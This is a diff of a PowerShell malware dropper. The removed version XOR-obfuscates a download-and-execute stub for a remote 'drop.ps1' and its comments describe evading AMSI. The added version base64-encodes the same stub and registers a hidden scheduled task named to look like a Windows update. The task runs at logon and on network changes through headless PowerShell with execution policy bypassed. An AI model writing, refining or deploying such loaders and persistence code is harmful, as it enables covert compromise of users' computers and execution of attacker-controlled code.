@@ -1,53 +1,12 @@
-$k = 1869;
-$$p1 = 'h' + 'tt' + 'ps://'; $p2 = 'raw.git' + 'hubuser'; $p3 = 'content.com/gwyn1869/winupdate/main/drop.ps1'
-$url = "$p1$p2$p3"
+$inner_task = 'Start-Sleep -s 10; try { $a="https://raw.githubuser"; $b="content.com/gwyn1869/winupdate/main/drop.ps1"; $d=(Invoke-RestMethod ($a+$b)); . ([scriptblock]::Create($d)) } catch {}'; 
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner_task); 
+$enc_task = [Convert]::ToBase64String($bytes); 
 
-# 1. This is the logic that stays HIDDEN
-$raw_logic = "Start-Sleep -s 8; try { `$d=(Invoke-RestMethod '$url'); . ([scriptblock]::Create(`$d)) } catch {}"
+$xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger><EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'&gt;&lt;Select Path='Microsoft-Windows-NetworkProfile/Operational'&gt;*[System[(EventID=10000)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments></Exec></Actions></Task>"; 
 
-# 2. Convert that logic into a list of XOR'd integers
-$charArray = ($raw_logic.ToCharArray() | ForEach-Object { [int]$_ -bxor $k }) -join ','
-
-# 3. This is the LOADER. This is what AMSI will see when it decodes the Base64.
-# It looks like a math loop, which is clean.
-$inner_task = "`$k=$k; `$h=@($charArray).ForEach({[char](`$_ -bxor `$k)}); `$u=-join `$h; .([scriptblock]::Create(`$u))"
-
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner_task)
-$enc_task = [Convert]::ToBase64String($bytes)
-
-# --- 2. Scheduled Task Creation (XML) ---
-# Using a new name 'WinUpdateSvc' to avoid any cache issues
-$xml = "<?xml version='1.0' encoding='UTF-16'?>
-<Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id='Author'>
-      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <Hidden>true</Hidden>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context='Author'>
-    <Exec>
-      <Command>conhost.exe</Command>
-      <Arguments>powershell.exe -NoExit -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments>
-    </Exec>
-  </Actions>
-</Task>"
-
-$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode
-schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSvc" /F
-Remove-Item "$env:TEMP\t.xml" -Force
+$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode; 
+schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
+Remove-Item "$env:TEMP\t.xml" -Force;
 
 
 $htmlPath = "$env:TEMP\sys_cache.html"
